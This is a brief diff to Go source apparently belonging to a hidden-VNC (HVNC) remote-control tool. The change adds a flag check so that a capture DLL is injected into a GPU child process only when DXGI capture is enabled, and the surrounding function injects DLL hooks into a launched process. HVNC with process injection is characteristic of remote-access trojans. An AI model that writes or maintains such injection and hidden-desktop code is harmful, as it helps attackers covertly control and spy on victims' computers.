@@ -808,7 +808,11 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureD
 	log.Printf("hvnc inject: process PID %d resumed with DLL hooks active", pid)
 
 	if len(captureDllBytes) > 0 {
-		go hvncDeferredGPUInject(pid, captureDllBytes)
+		if !hvncDXGIEnabled.Load() {
+			log.Printf("hvnc inject: DXGI is disabled, skipping capture DLL injection for GPU child process")
+		} else {
+			go hvncDeferredGPUInject(pid, captureDllBytes)
+		}
 	}
 
 	return pid, nil
